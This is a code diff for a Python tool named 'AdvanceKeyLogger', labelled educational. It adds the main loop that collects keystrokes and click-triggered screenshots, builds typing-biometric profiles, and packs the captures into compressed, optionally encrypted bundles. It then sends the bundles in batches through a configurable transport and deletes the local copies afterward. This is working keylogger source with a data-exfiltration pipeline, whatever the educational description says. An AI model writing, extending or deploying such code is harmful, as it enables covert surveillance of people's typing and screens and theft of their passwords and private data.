@@ -14,16 +14,36 @@ Usage:
 from __future__ import annotations
 
 import argparse
+import base64
+import contextlib
+import io
+import json
 import logging
+import os
 import sys
 import time
+import zipfile
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Any
 
-from config.settings import Settings
-from utils.logger_setup import setup_logging
-from utils.process import PIDLock, GracefulShutdown
-from utils.system_info import get_system_info
 from capture import create_enabled_captures, list_captures
-from transport import list_transports
+from config.settings import Settings
+from pipeline import Pipeline
+from biometrics.analyzer import BiometricsAnalyzer
+from storage.manager import StorageManager
+from storage.sqlite_storage import SQLiteStorage
+from transport import create_transport, list_transports
+from utils.compression import gzip_data
+from utils.crypto import encrypt, generate_key, key_from_base64, key_to_base64
+from utils.logger_setup import setup_logging
+from utils.process import GracefulShutdown, PIDLock
+from utils.resilience import CircuitBreaker, TransportQueue
+from utils.system_info import get_system_info
+
+# Plugin modules are auto-imported by capture/__init__.py and
+# transport/__init__.py via their self-registration loops.
+# No explicit imports needed here.
 
 logger = logging.getLogger(__name__)
 
@@ -32,7 +52,10 @@ def parse_args() -> argparse.Namespace:
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
         prog="AdvanceKeyLogger",
-        description="Educational input monitoring tool for learning OS APIs and software architecture.",
+        description=(
+            "Educational input monitoring tool for learning"
+            " OS APIs and software architecture."
+        ),
     )
     parser.add_argument(
         "-c", "--config",
@@ -73,6 +96,193 @@ def parse_args() -> argparse.Namespace:
         version="%(prog)s 0.1.0",
     )
     return parser.parse_args()
+
+
+def _serialize_for_storage(value: Any) -> str:
+    if isinstance(value, (dict, list)):
+        return json.dumps(value)
+    if isinstance(value, bytes):
+        return base64.b64encode(value).decode("utf-8")
+    return str(value)
+
+
+def _to_jsonable(value: Any) -> Any:
+    if isinstance(value, (dict, list, str, int, float, bool)) or value is None:
+        return value
+    if isinstance(value, bytes):
+        return {"_type": "bytes", "base64": base64.b64encode(value).decode("utf-8")}
+    return str(value)
+
+
+def _zip_bundle(records_json: bytes, file_paths: list[str], compress: bool) -> bytes:
+    compression = zipfile.ZIP_DEFLATED if compress else zipfile.ZIP_STORED
+    buffer = io.BytesIO()
+    with zipfile.ZipFile(buffer, "w", compression) as zf:
+        zf.writestr("records.json", records_json)
+        seen: set[str] = set()
+        for idx, filepath in enumerate(file_paths):
+            path = Path(filepath)
+            if path.exists() and path.is_file():
+                arcname = path.name
+                if arcname in seen:
+                    arcname = f"{idx}_{arcname}"
+                seen.add(arcname)
+                zf.write(str(path), arcname=arcname)
+            else:
+                logger.warning("Missing attachment, skipping: %s", filepath)
+    return buffer.getvalue()
+
+
+def _build_report_bundle(
+    items: list[dict[str, Any]],
+    config: dict[str, Any],
+    sys_info: dict[str, str],
+) -> tuple[bytes, dict[str, str], list[str]]:
+    records = []
+    file_paths: list[str] = []
+
+    for item in items:
+        record = {
+            "type": item.get("type", "unknown"),
+            "timestamp": item.get("timestamp"),
+            "data": _to_jsonable(item.get("data")),
+        }
+        file_path = item.get("path") or item.get("file_path")
+        if file_path:
+            record["path"] = file_path
+            file_paths.append(file_path)
+        if "size" in item:
+            record["size"] = item.get("size")
+        records.append(record)
+
+    payload = {
+        "system": sys_info,
+        "generated_at": datetime.now(timezone.utc).isoformat(),
+        "records": records,
+    }
+    records_json = json.dumps(payload, indent=2, ensure_ascii=True).encode("utf-8")
+
+    compression_cfg = config.get("compression", {})
+    compress_enabled = bool(compression_cfg.get("enabled", True))
+    fmt = str(compression_cfg.get("format", "zip")).lower()
+    # Include microseconds to avoid filename collisions when multiple batches
+    # are generated within the same second (e.g., small report_interval)
+    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S_%f")
+
+    if compress_enabled:
+        if fmt == "gzip":
+            if file_paths:
+                zipped = _zip_bundle(records_json, file_paths, compress=True)
+                data = gzip_data(zipped)
+                filename = f"report_{timestamp}.zip.gz"
+            else:
+                data = gzip_data(records_json)
+                filename = f"report_{timestamp}.json.gz"
+            meta = {"filename": filename, "content_type": "application/gzip"}
+            return data, meta, file_paths
+
+        data = _zip_bundle(records_json, file_paths, compress=True)
+        filename = f"report_{timestamp}.zip"
+        meta = {"filename": filename, "content_type": "application/zip"}
+        return data, meta, file_paths
+
+    if file_paths:
+        data = _zip_bundle(records_json, file_paths, compress=False)
+        filename = f"report_{timestamp}.zip"
+        meta = {"filename": filename, "content_type": "application/zip"}
+        return data, meta, file_paths
+
+    filename = f"report_{timestamp}.json"
+    meta = {"filename": filename, "content_type": "application/json"}
+    return records_json, meta, file_paths
+
+
+def _load_encryption_key(config: dict[str, Any], data_dir: str) -> bytes:
+    enc_cfg = config.get("encryption", {})
+    key_b64 = enc_cfg.get("key")
+    if key_b64:
+        return key_from_base64(str(key_b64))
+
+    key = generate_key()
+    b64 = key_to_base64(key)
+
+    key_path = Path(data_dir) / "encryption.key"
+    fd = os.open(str(key_path), os.O_CREAT | os.O_WRONLY | os.O_TRUNC, 0o600)
+    try:
+        os.write(fd, b64.encode("utf-8"))
+    finally:
+        os.close(fd)
+
+    enc_cfg["key"] = b64
+    logger.warning("Encryption key generated and stored at %s", key_path)
+    return key
+
+
+def _apply_encryption(
+    payload: bytes,
+    metadata: dict[str, str],
+    config: dict[str, Any],
+    data_dir: str,
+) -> tuple[bytes, dict[str, str]]:
+    enc_cfg = config.get("encryption", {})
+    if not enc_cfg.get("enabled", False):
+        return payload, metadata
+
+    key = _load_encryption_key(config, data_dir)
+    encrypted = encrypt(payload, key)
+    meta = dict(metadata)
+    meta["filename"] = f"{meta.get('filename', 'report.bin')}.enc"
+    meta["content_type"] = "application/octet-stream"
+    return encrypted, meta
+
+
+def _cleanup_files(file_paths: list[str]) -> None:
+    for filepath in file_paths:
+        try:
+            path = Path(filepath)
+            if path.exists():
+                path.unlink()
+        except OSError as exc:
+            logger.warning("Failed to remove %s: %s", filepath, exc)
+
+
+def _items_from_sqlite(rows: list[dict[str, Any]]) -> tuple[list[dict[str, Any]], list[int]]:
+    items = []
+    ids: list[int] = []
+    for row in rows:
+        ids.append(int(row["id"]))
+        item: dict[str, Any] = {
+            "type": row.get("type"),
+            "data": row.get("data"),
+            "path": row.get("file_path"),
+            "timestamp": row.get("timestamp"),
+        }
+        # Include file_size as "size" so _build_report_bundle can use it
+        file_size = row.get("file_size")
+        if file_size is not None:
+            item["size"] = file_size
+        items.append(item)
+    return items, ids
+
+
+def _needs_sqlite_for_routes(config: dict[str, Any]) -> bool:
+    pipeline_cfg = config.get("pipeline", {}) if isinstance(config, dict) else {}
+    if not pipeline_cfg.get("enabled", False):
+        return False
+    middleware_cfgs = pipeline_cfg.get("middleware", [])
+    for entry in middleware_cfgs:
+        if not isinstance(entry, dict):
+            continue
+        if entry.get("name") != "conditional_router":
+            continue
+        if not entry.get("enabled", True):
+            continue
+        routes = (entry.get("config") or {}).get("routes", {})
+        if "sqlite" in routes.values():
+            return True
+    return False
+
+
 
 
 def main() -> int:
@@ -131,8 +341,23 @@ def main() -> int:
         sys_info["os_release"],
     )
 
-    # --- Create capture modules ---
+    # --- Create config snapshot ---
     config = settings.as_dict()
+
+    # --- Pipeline (optional) ---
+    pipeline_enabled = bool(settings.get("pipeline.enabled", False))
+    pipeline = Pipeline(config, sys_info) if pipeline_enabled else None
+
+    # --- Biometrics (optional) ---
+    biometrics_enabled = bool(settings.get("biometrics.enabled", False))
+    biometrics_buffer: list[dict[str, Any]] = []
+    biometrics_analyzer = BiometricsAnalyzer(
+        profile_id_prefix=str(settings.get("biometrics.profile_id_prefix", "usr"))
+    )
+    biometrics_sample_size = int(settings.get("biometrics.sample_size", 500))
+    biometrics_store = bool(settings.get("biometrics.store_profiles", True))
+
+    # --- Create capture modules ---
     captures = create_enabled_captures(config)
 
     if not captures:
@@ -147,6 +372,41 @@ def main() -> int:
         return 0
 
     logger.info("Enabled captures: %s", ", ".join(str(c) for c in captures))
+
+    # --- Wire mouse clicks to screenshot capture (on-demand screenshots) ---
+    screenshot_capture = next(
+        (cap for cap in captures if hasattr(cap, "take_screenshot")), None
+    )
+    if screenshot_capture:
+        for cap in captures:
+            if hasattr(cap, "set_click_callback"):
+                try:
+                    cap.set_click_callback(screenshot_capture.take_screenshot)
+                    logger.info("Mouse clicks wired to screenshot capture")
+                except Exception as exc:
+                    logger.warning("Failed to wire mouse capture: %s", exc)
+
+    # --- Storage + transport setup ---
+    data_dir = settings.get("general.data_dir", "./data")
+    storage_backend = settings.get("storage.backend", "local")
+    storage_manager = StorageManager(
+        data_dir=data_dir,
+        max_size_mb=int(settings.get("storage.max_size_mb", 500)),
+        rotation=bool(settings.get("storage.rotation", True)),
+    )
+    sqlite_store = None
+    sqlite_needed = storage_backend == "sqlite" or _needs_sqlite_for_routes(config)
+    if sqlite_needed:
+        sqlite_store = SQLiteStorage(settings.get("storage.sqlite_path", "./data/captures.db"))
+
+    transport = create_transport(config)
+    batch_size = int(settings.get("transport.batch_size", 50))
+
+    queue = TransportQueue(max_size=int(settings.get("transport.queue_size", 1000)))
+    breaker = CircuitBreaker(
+        failure_threshold=int(settings.get("transport.failure_threshold", 5)),
+        cooldown=float(settings.get("transport.cooldown", 60)),
+    )
 
     # --- Graceful shutdown handler ---
     shutdown = GracefulShutdown()
@@ -166,13 +426,123 @@ def main() -> int:
     if args.dry_run:
         logger.info("DRY RUN mode — data will be captured but not sent")
 
+    last_report = 0.0
     try:
         while not shutdown.requested:
-            time.sleep(min(report_interval, 1.0))
+            time.sleep(0.2)
+            now = time.time()
+            if now - last_report < report_interval:
+                continue
+            last_report = now
 
-            # Check if it's time to report
-            # (In a full implementation, you'd track elapsed time and
-            #  call collect() on each capture, then send via transport)
+            # Collect from all captures
+            collected: list[dict[str, Any]] = []
+            for cap in captures:
+                try:
+                    collected.extend(cap.collect())
+                except Exception as exc:
+                    logger.error("Collect failed for %s: %s", cap, exc)
+
+            if pipeline is not None and collected:
+                collected = pipeline.process_batch(collected)
+
+            if biometrics_enabled:
+                timing_events = [e for e in collected if e.get("type") == "keystroke_timing"]
+                if timing_events:
+                    biometrics_buffer.extend(timing_events)
+                    if len(biometrics_buffer) >= biometrics_sample_size:
+                        sample = biometrics_buffer[:biometrics_sample_size]
+                        biometrics_buffer = biometrics_buffer[biometrics_sample_size:]
+                        try:
+                            profile = biometrics_analyzer.generate_profile(sample)
+                            if biometrics_store and sqlite_store is not None:
+                                try:
+                                    sqlite_store.insert_profile(profile.to_dict())
+                                except Exception as exc:
+                                    logger.error("Failed to store biometrics profile: %s", exc)
+                            profile_event = {
+                                "type": "biometrics_profile",
+                                "data": profile.to_dict(),
+                                "timestamp": time.time(),
+                            }
+                            if biometrics_store:
+                                collected.append(profile_event)
+                        except Exception as exc:
+                            logger.error("Biometrics analysis failed: %s", exc)
+
+            if sqlite_store is not None:
+                if storage_backend == "sqlite":
+                    sqlite_items = collected
+                    queue_items: list[dict[str, Any]] = []
+                else:
+                    sqlite_items = [i for i in collected if i.get("route") == "sqlite"]
+                    queue_items = [i for i in collected if i.get("route") != "sqlite"]
+
+                for item in sqlite_items:
+                    data_value = item.get("data")
+                    data_str = _serialize_for_storage(data_value) if data_value is not None else ""
+                    file_path = item.get("path") or item.get("file_path") or ""
+                    file_size = item.get("size", 0) or 0
+                    if file_path and not file_size:
+                        try:
+                            file_size = Path(file_path).stat().st_size
+                        except OSError:
+                            file_size = 0
+                    sqlite_store.insert(
+                        item.get("type", "unknown"),
+                        data=data_str,
+                        file_path=file_path,
+                        file_size=file_size,
+                    )
+
+                if queue_items:
+                    queue.enqueue_many(queue_items)
+
+                pending_rows = sqlite_store.get_pending(limit=batch_size)
+                batch_items, batch_ids = _items_from_sqlite(pending_rows)
+            else:
+                if collected:
+                    queue.enqueue_many(collected)
+                batch_items = queue.drain(batch_size=batch_size)
+                batch_ids = []
+
+            if not batch_items:
+                continue
+
+            if args.dry_run:
+                logger.info("Dry run: captured %d items", len(batch_items))
+                if sqlite_store is None:
+                    queue.requeue(batch_items)
+                continue
+
+            if not breaker.can_proceed():
+                logger.warning("Circuit open, skipping send")
+                if sqlite_store is None:
+                    queue.requeue(batch_items)
+                continue
+
+            payload, metadata, file_paths = _build_report_bundle(batch_items, config, sys_info)
+            payload, metadata = _apply_encryption(payload, metadata, config, data_dir)
+
+            try:
+                success = transport.send(payload, metadata)
+            except Exception as exc:
+                logger.error("Transport send failed: %s", exc)
+                success = False
+
+            if success:
+                breaker.record_success()
+                if sqlite_store is not None:
+                    sqlite_store.mark_sent(batch_ids)
+                    # Purge old sent records to prevent unbounded database growth
+                    purge_age = config.get("storage", {}).get("purge_sent_after_seconds", 86400)
+                    sqlite_store.purge_sent(older_than_seconds=purge_age)
+                _cleanup_files(file_paths)
+                storage_manager.rotate()
+            else:
+                breaker.record_failure()
+                if sqlite_store is None:
+                    queue.requeue(batch_items)
 
     except KeyboardInterrupt:
         logger.info("KeyboardInterrupt received")
@@ -189,6 +559,12 @@ def main() -> int:
 
     if pid_lock:
         pid_lock.release()
+
+    if sqlite_store is not None:
+        sqlite_store.close()
+
+    with contextlib.suppress(Exception):
+        transport.disconnect()
 
     shutdown.restore()
     logger.info("AdvanceKeyLogger stopped.")
